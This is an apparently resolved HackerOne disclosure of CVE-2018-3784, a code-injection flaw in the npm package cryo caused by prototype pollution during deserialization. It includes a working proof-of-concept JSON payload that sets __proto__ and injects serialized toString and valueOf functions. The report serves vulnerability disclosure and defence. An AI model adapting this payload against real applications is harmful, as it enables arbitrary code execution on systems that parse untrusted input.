# [H] Insecure implementation of deserialization in cryo

## Summary
Severity: High (CVSS 8.7)
Program: Node.js third-party modules
Weakness: Code Injection
Reporter: greendog
State: resolved
Disclosed: 2018-06-19T15:51:37.020Z
CVE: CVE-2018-3784
Source: https://hackerone.com/reports/350418

## Details
I would like to report code injection in serialization package cryo
It allows execute arbitrary code using custom prototype.

# Module

**module name:** cryo
**version:** 0.0.6
**npm page:** `https://www.npmjs.com/package/cryo`

## Module Description

JSON on steroids.
Built for node.js and browsers. Cryo is inspired by Python's pickle and works similarly to JSON.stringify() and JSON.parse(). Cryo.stringify() and Cryo.parse() improve on JSON in these circumstances:

## Module Stats

37 downloads in the last week

# Vulnerability

## Vulnerability Description

If an application uses "cryo" package to deserialize JSON into an object and interacts with the object later in the code (convert to sting, for example) and if an attacker controls this JSON, then the attacker can get arbitrary code execution in the application.

To reconstruct an object from JSON, cryo uses square bracket notation ( `obj[key]=value` ). So there is an opportunity for an attacker to change `__proto__` property for a new object. Also Cryo supports serialization of functions, so the attacker can set their own methods (toString, valueOf) for the new object.
It means that if later in the code the application interacts with the new object in the way which leads to invocation of the object's prototype functions, then the attacker malicious code are executed.


## Steps To Reproduce:

PoC:
```
var Cryo = require('cryo');
var frozen = '{"root":"_CRYO_REF_3","references":[{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\"); return 1111;}"},{"contents":{},"value":"_CRYO_FUNCTION_function () {console.log(\\"defconrussia\\");return 2222;}"},{"contents":{"toString":"_CRYO_REF_0","valueOf":"_CRYO_REF_1"},"value":"_CRYO_OBJECT_"},{"contents":{"__proto__":"_CRYO_REF_2"},"value":"_CRYO_OBJECT_"}]}'
var hydrated = Cryo.parse(frozen);
console.log(hydrated);
```
console.log internally calls hydrated's vauleOf method, so an attacker's code are executed and we can see "defconrussia" in console.

_Trimmed to 38 lines — full report: https://hackerone.com/reports/350418_
